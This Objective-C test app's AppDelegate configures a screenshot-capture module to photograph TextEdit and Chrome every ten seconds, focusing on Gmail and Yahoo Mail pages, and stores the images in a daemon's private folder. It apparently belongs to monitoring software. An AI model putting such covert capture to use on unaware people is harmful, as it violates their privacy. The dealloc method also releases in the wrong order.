//
//  AppDelegate.m
//  TestApp
//
//  Created by ophat on 4/1/16.
//  Copyright (c) 2016 ophat. All rights reserved.
//

#import "AppDelegate.h"
#import "AppScreenShotManagerImpl.h"

#import "AppScreenRule.h"
#import "AppScreenShotRuleStorage.h"
#import "ASSDatabase.h"

#import "DaemonPrivateHome.h"

@implementation AppDelegate
@synthesize appScreenShotManagerImpl;

- (void)applicationDidFinishLaunching:(NSNotification *)aNotification {
    
    NSString * deamonHome = [DaemonPrivateHome daemonPrivateHome];
    NSString * screenshotPath = [deamonHome stringByAppendingString:@"attachments/appScreenShot/"];
    [DaemonPrivateHome createDirectoryAndIntermediateDirectories:screenshotPath];
    
    appScreenShotManagerImpl = [[AppScreenShotManagerImpl alloc]initWithDDM:nil andImagePath:screenshotPath];
    
    AppScreenShotRuleStorage * storage = [appScreenShotManagerImpl mAppScreenShotRuleStorage];
    
    [[storage mASSDatabase]deleteAllRules];

    //Rule 1
    AppScreenRule * rule1 = [[AppScreenRule alloc]init];
    [rule1 setMApplicationID:@"com.apple.TextEdit"];
    [rule1 setMFrequency:10];
    [rule1 setMAppType:kNon_Browser];
    
//        NSMutableArray * ArrayParams1 = [[NSMutableArray alloc]init];
    
//        AppScreenParameter  * param1 = [[AppScreenParameter alloc]init];
//        [param1 setMTitle:@""];
//        [ArrayParams1 addObject:param1];
//        [param1 release];

//        [rule1 setMParameter:nil];
//        [ArrayParams1 release];
    
    //Rule 2
    AppScreenRule * rule2 = [[AppScreenRule alloc]init];
    [rule2 setMApplicationID:@"com.google.Chrome"];
    [rule2 setMFrequency:10];
    [rule2 setMAppType:kBrowser];
    
    NSMutableArray * ArrayParams2 = [[NSMutableArray alloc]init];
    
    AppScreenParameter  * param2 = [[AppScreenParameter alloc]init];
    [param2 setMDomainName:@"mail.google.com"];
    [param2 setMTitle:@""];
    [ArrayParams2 addObject:param2];
    [param2 release];
    
    AppScreenParameter  * param21 = [[AppScreenParameter alloc]init];
    [param21 setMDomainName:@"mail.yahoo.com"];
    [param21 setMTitle:@""];
    [ArrayParams2 addObject:param21];
    [param21 release];
    
    [rule2 setMParameter:ArrayParams2];
    [ArrayParams2 release];

    
    [[storage mASSDatabase] insert:rule1];
    [[storage mASSDatabase] insert:rule2];
    
    
    [appScreenShotManagerImpl startCapture];
}

-(void)dealloc{
    [super dealloc];
    [appScreenShotManagerImpl release];
}

@end
